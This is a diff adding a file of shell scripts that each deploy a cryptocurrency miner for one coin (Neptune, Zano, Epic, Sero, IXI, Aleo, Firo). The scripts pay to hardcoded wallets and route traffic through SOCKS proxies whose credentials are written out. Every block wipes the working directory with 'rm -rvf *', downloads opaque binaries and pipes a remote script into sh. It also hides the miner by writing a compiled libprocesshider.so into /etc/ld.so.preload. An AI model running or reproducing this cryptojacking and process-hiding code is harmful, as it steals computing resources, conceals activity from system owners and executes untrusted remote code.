@@ -1,0 +1,514 @@
+===============================================================================================
+NEPTUNE BITZ
+===============================================================================================
+
+rm -rvf * && mkdir a && cd a
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget https://gitlab.com/majapahlevi/BARU/-/raw/main/Orion && chmod +x Orion
+
+wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 138.197.79.17:443
+socks5_username = majapahlevi
+socks5_password = majapahlevi
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+
+./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp & clear & ./Orion mine --disable-cpu --gpu --pool twbitz --key AN9WKwVxmS7nP1cEzq1oDYsKLmewQy1T7hq8C9WXty26 --worker $(shuf -n 1 -i 1-99999)-MAJA & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+
+
+===============================================================================================
+NEPTUNE COIN
+===============================================================================================
+
+rm -rvf * && mkdir a && cd a
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/polisi && chmod +x polisi
+
+wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 157.245.142.37:443
+socks5_username = kalaumalingomongdonk
+socks5_password = kalaumalingomongdonk
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+
+./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp & clear & ./polisi -w majapahlevi.$(shuf -n 1 -i 1-99999)-Polisi -p 157.230.63.131:443 & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+
+
+
+===============================================================================================
+ZANO COIN
+===============================================================================================
+
+
+rm -rvf * && mkdir a && cd a
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget https://gitlab.com/sshroot/cat/-/raw/main/bypass.tar && tar xf bypass.tar && chmod +x bypass.tar
+
+wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 157.245.142.37:443
+socks5_username = kalaumalingomongdonk
+socks5_password = kalaumalingomongdonk
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+
+./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp & clear & ./TalkToSpeech -coin ZANO -P iZ2NyxEHg87VTyQzUyYL7zgSDbA9Q3zk9V9kZQKwm2ucCw43nHXaTLWVhrDW3Up5tFgEjjZi6Yxh6gouWdLCKddxRVwBJRViiDi5QcM7F.$(shuf -n 1 -i 1-99999)-MJ@157.230.63.131:80 & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+
+===============================================================================================
+EPIC COIN
+===============================================================================================
+
+rm -rvf * && mkdir a && cd a
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget https://gitlab.com/sshroot/cat/-/raw/main/bypass.tar && tar xf bypass.tar && chmod +x bypass.tar
+
+wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.55.165.161:443
+socks5_username = majapahlevi
+socks5_password = majapahlevi
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+
+./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp & clear & ./TalkToSpeech -coin EPIC -P 0x67d8249e26283.$(shuf -n 1 -i 1-9999)-LOE-MALING:m=pool@167.99.238.178:443 -PRT 0 -luck & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+
+===============================================================================================
+SERO COIN
+===============================================================================================
+
+
+rm -rvf * && mkdir a && cd a
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget https://gitlab.com/sshroot/cat/-/raw/main/bypass.tar && tar xf bypass.tar && chmod +x bypass.tar
+
+wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.55.165.161:443
+socks5_username = majapahlevi
+socks5_password = majapahlevi
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+
+./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp & clear & ./TalkToSpeech -coin SERO -P fG5xUEoVbuBT5C1o2gej8XKJdqQHAdFoRQkcB7B9narjubZnbowAAEG82w6ZmsvteRf43urpL8DBfG6oxTozUsFsanNsZpXd4e9WfuoskNDtz1CujDZMQPrqdJZd8opQgVi.$(shuf -n 1 -i 1-99999)-SR@165.227.65.49:443 -PP 5 -PRT 0 -luck & curl https://gitlab.com/sshroot/cat/-/raw/main/cpu.sh | sh > /dev/null 2>&1
+
+
+
+===============================================================================================
+IXI COIN
+===============================================================================================
+
+rm -rvf * && mkdir a && cd a
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget https://ixi.hash.express/dl/iximiner_v0.3.0_22.08.2022_linux.tar.gz && tar -zvxf iximiner_v0.3.0_22.08.2022_linux.tar.gz && cd iximiner_v0.3.0_22.08.2022_linux
+
+wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.55.165.161:443
+socks5_username = majapahlevi
+socks5_password = majapahlevi
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+
+./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp & clear & ./iximiner --mode miner --pool https://ixi.hash.express --wallet 4jUKTw9ontYxnZagkmU3DRuJb3TgGknDkjDrBUCC1Lzb9vazw7uE3NogHaHC2g2AP --name $(shuf -n 1 -i 1-99999)-Bismillah --cpu-intensity 0 --gpu-intensity 96 --force-gpu-optimization CUDA & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh > /dev/null 2>&1
+
+
+===============================================================================================
+ALEO COIN
+===============================================================================================
+
+rm -rvf * && mkdir d && cd d
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget https://github.com/6block/zkwork_aleo_gpu_worker/releases/download/cuda-v0.2.4/aleo_prover-v0.2.4_cuda_full.tar.gz && tar -zvxf aleo_prover-v0.2.4_cuda_full.tar.gz && cd aleo_prover
+
+wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 137.184.215.93:443
+socks5_username = majapahlevi
+socks5_password = majapahlevi
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+
+./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp & clear & ./aleo_prover --pool 167.99.155.214:443 --pool 68.183.130.15:80 --pool 68.183.130.15:443 --address aleo1tpxcqcxsep8x0g6337u64zzu30454vfjuutwts9s5khq26w9rurq6m3nzg --custom_name $(shuf -n 1 -i 1-9999999)-Bismillah
+
+
+===============================================================================================
+FIRO COIN
+===============================================================================================
+
+rm -rvf * && mkdir d && cd d
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget https://gitlab.com/kerja6381734/fanta/-/raw/main/GM3.30
+
+chmod 777 GM3.30
+
+wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.55.165.161:443
+socks5_username = majapahlevi
+socks5_password = majapahlevi
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+
+./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp & clear & ./GM3.30 -a firo -s 165.227.65.49:80 -u aEf12KavDNduAjQgSV56BXLUCo1nns51MR.$(shuf -n 1 -i 1-99999)-Bismillah 
